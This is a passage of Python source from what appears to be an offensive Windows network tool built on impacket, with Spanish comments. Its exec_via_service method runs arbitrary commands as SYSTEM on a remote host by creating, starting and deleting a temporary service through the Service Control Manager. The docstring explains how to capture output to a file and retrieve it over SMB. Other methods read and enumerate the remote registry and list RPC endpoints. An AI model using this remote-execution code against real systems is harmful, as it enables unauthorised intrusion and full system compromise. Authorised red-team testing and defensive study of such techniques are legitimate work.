        Retorna el handle del servicio creado, o None si falla.
        """
        try:
            dce   = self._dce_svcctl()
            scm_h = self._scm_open(dce)

            resp  = scmr.hRCreateServiceW(
                dce, scm_h,
                name, display_name,
                lpBinaryPathName=binary_path,
                dwServiceType=scmr.SERVICE_WIN32_OWN_PROCESS,
                dwStartType=scmr.SERVICE_DEMAND_START,
                dwErrorControl=scmr.SERVICE_ERROR_IGNORE,
            )
            svc_h = resp["lpServiceHandle"]
            print_result("RPC", self.target.ip, "ok",
                         "servicio '{}' creado".format(name))
            scmr.hRCloseServiceHandle(dce, scm_h)
            return svc_h

        except DCERPCException as exc:
            print_result("RPC", self.target.ip, "fail",
                         "SCM create_service: {}".format(exc))
            return None

    def start_service(self, name):
        """Arranca un servicio por nombre."""
        try:
            dce   = self._dce_svcctl()
            scm_h = self._scm_open(dce)
            resp  = scmr.hROpenServiceW(dce, scm_h, name)
            svc_h = resp["lpServiceHandle"]
            try:
                scmr.hRStartServiceW(dce, svc_h)
                print_result("RPC", self.target.ip, "ok",
                             "servicio '{}' arrancado".format(name))
                return True
            finally:
                scmr.hRCloseServiceHandle(dce, svc_h)
                scmr.hRCloseServiceHandle(dce, scm_h)
        except DCERPCException as exc:
            print_result("RPC", self.target.ip, "fail",
                         "SCM start_service '{}': {}".format(name, exc))
            return False

    def stop_service(self, name):
        """Para un servicio por nombre."""
        try:
            dce   = self._dce_svcctl()
            scm_h = self._scm_open(dce)
            resp  = scmr.hROpenServiceW(dce, scm_h, name)
            svc_h = resp["lpServiceHandle"]
            try:
                scmr.hRControlService(dce, svc_h, scmr.SERVICE_CONTROL_STOP)
                print_result("RPC", self.target.ip, "ok",
                             "servicio '{}' detenido".format(name))
                return True
            finally:
                scmr.hRCloseServiceHandle(dce, svc_h)
                scmr.hRCloseServiceHandle(dce, scm_h)
        except DCERPCException as exc:
            print_result("RPC", self.target.ip, "fail",
                         "SCM stop_service '{}': {}".format(name, exc))
            return False

    def delete_service(self, name):
        """Elimina un servicio por nombre."""
        try:
            dce   = self._dce_svcctl()
            scm_h = self._scm_open(dce)
            resp  = scmr.hROpenServiceW(dce, scm_h, name)
            svc_h = resp["lpServiceHandle"]
            try:
                scmr.hRDeleteService(dce, svc_h)
                print_result("RPC", self.target.ip, "ok",
                             "servicio '{}' eliminado".format(name))
                return True
            finally:
                scmr.hRCloseServiceHandle(dce, svc_h)
                scmr.hRCloseServiceHandle(dce, scm_h)
        except DCERPCException as exc:
            print_result("RPC", self.target.ip, "fail",
                         "SCM delete_service '{}': {}".format(name, exc))
            return False

    def exec_via_service(self, command, svc_name="LobSvc"):
        """
        Ejecución remota de comandos vía SCM: create → start → delete.

        command: comando a ejecutar (ej: 'cmd.exe /c whoami > C:\\out.txt')
        svc_name: nombre temporal del servicio (default: LobSvc)

        Retorna True si el servicio se arrancó correctamente.
        NOTA: el proceso arranca como SYSTEM pero no hay retorno de output.
        Usa 'cmd.exe /c <cmd> > C:\\Windows\\Temp\\out.txt' y luego descarga
        el fichero vía SMB.
        """
        print_result("RPC", self.target.ip, "info",
                     "exec_via_service: '{}'".format(command))
        created = self.create_service(svc_name, svc_name, command)
        if not created:
            return False

        ok = self.start_service(svc_name)
        time.sleep(1)  # Dar tiempo al servicio a ejecutar
        self.stop_service(svc_name)
        self.delete_service(svc_name)

        if ok:
            session_db.save_finding(
                self.target.ip, "RPC", "exec_via_service",
                "cmd={}".format(command[:100]),
            )
        return ok

    # ==================================================================
    # WINREG — Windows Registry Remote Protocol
    # ==================================================================

    def reg_query(self, hive, key, value):
        """
        Lee un valor del registro remoto.
        hive: "HKLM" | "HKCU" | "HKCR" | "HKU", o su valor numérico
        key:  ruta al key (ej: "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion")
        value: nombre del valor (ej: "ProductName")
        Retorna (data_type, data) o (None, None) si falla.
        """
        try:
            dce     = self._dce_winreg()
            hive_id = HIVE_NAMES.get(str(hive).upper(), hive) if isinstance(hive, str) else hive

            ans = rrp.hOpenClassesRoot(dce) if hive_id == HKCR else \
                  rrp.hOpenLocalMachine(dce) if hive_id == HKLM else \
                  rrp.hOpenCurrentUser(dce) if hive_id == HKCU else \
                  rrp.hOpenUsers(dce)

            root_h = ans["phKey"]
            try:
                key_h_resp = rrp.hBaseRegOpenKey(dce, root_h, key)
                key_h      = key_h_resp["phkResult"]
                try:
                    val_resp = rrp.hBaseRegQueryValue(dce, key_h, value)
                    data_type = int(val_resp["pdwType"])
                    data      = val_resp["pvData"]
                    return data_type, data
                finally:
                    rrp.hBaseRegCloseKey(dce, key_h)
            finally:
                rrp.hBaseRegCloseKey(dce, root_h)

        except DCERPCException as exc:
            print_result("RPC", self.target.ip, "fail",
                         "WINREG query {}\\{}\\{}: {}".format(hive, key, value, exc))
            return None, None

    def reg_enum_keys(self, hive, key):
        """
        Enumera subkeys de una clave de registro remota.
        Retorna lista de nombres de subkey.
        """
        try:
            dce     = self._dce_winreg()
            hive_id = HIVE_NAMES.get(str(hive).upper(), hive) if isinstance(hive, str) else hive

            ans = rrp.hOpenLocalMachine(dce) if hive_id == HKLM else rrp.hOpenUsers(dce)
            root_h = ans["phKey"]
            try:
                key_h_resp = rrp.hBaseRegOpenKey(dce, root_h, key)
                key_h      = key_h_resp["phkResult"]
                try:
                    subkeys = []
                    idx = 0
                    while True:
                        try:
                            resp = rrp.hBaseRegEnumKey(dce, key_h, idx)
                            subkeys.append(str(resp["lpNameOut"]).rstrip("\x00"))
                            idx += 1
                        except DCERPCException:
                            break
                    return subkeys
                finally:
                    rrp.hBaseRegCloseKey(dce, key_h)
            finally:
                rrp.hBaseRegCloseKey(dce, root_h)

        except DCERPCException as exc:
            print_result("RPC", self.target.ip, "fail",
                         "WINREG enum_keys {}\\{}: {}".format(hive, key, exc))
            return []

    def reg_enum_values(self, hive, key):
        """
        Enumera valores de una clave de registro remota.
        Retorna lista de dicts: {name, type, data}
        """
        try:
            dce     = self._dce_winreg()
            hive_id = HIVE_NAMES.get(str(hive).upper(), hive) if isinstance(hive, str) else hive

            ans    = rrp.hOpenLocalMachine(dce) if hive_id == HKLM else rrp.hOpenUsers(dce)
            root_h = ans["phKey"]
            try:
                key_h_resp = rrp.hBaseRegOpenKey(dce, root_h, key)
                key_h      = key_h_resp["phkResult"]
                try:
                    values = []
                    idx = 0
                    while True:
                        try:
                            resp = rrp.hBaseRegEnumValue(dce, key_h, idx)
                            values.append({
                                "name": str(resp["lpValueNameOut"]).rstrip("\x00"),
                                "type": int(resp["lpType"]),
                                "data": bytes(resp["lpData"]),
                            })
                            idx += 1
                        except DCERPCException:
                            break
                    return values
                finally:
                    rrp.hBaseRegCloseKey(dce, key_h)
            finally:
                rrp.hBaseRegCloseKey(dce, root_h)

        except DCERPCException as exc:
            print_result("RPC", self.target.ip, "fail",
                         "WINREG enum_values {}\\{}: {}".format(hive, key, exc))
            return []

    # ==================================================================
    # EPM — Endpoint Mapper
    # ==================================================================

    def enumerate_endpoints(self):
        """
        Enumera los endpoints RPC registrados en el sistema.
        Retorna lista de dicts: {uuid, annotation, address, protocol}
        """
        try:
            entries = epm.hept_lookup(self.target.ip)
            results = []
            for entry in entries:
                results.append({
                    "uuid":       str(entry["tower"]["Floors"][0]),
                    "annotation": str(entry.get("annotation", "")),
                    "address":    str(entry["tower"]["Floors"][-1]) if len(entry["tower"]["Floors"]) > 1 else "",
                })
            session_db.save_finding(
                self.target.ip, "RPC", "epm_endpoints",
                "{} endpoints".format(len(results)),
            )
            return results
        except Exception as exc:
            print_result("RPC", self.target.ip, "fail",
                         "EPM enumerate: {}".format(exc))
            return []
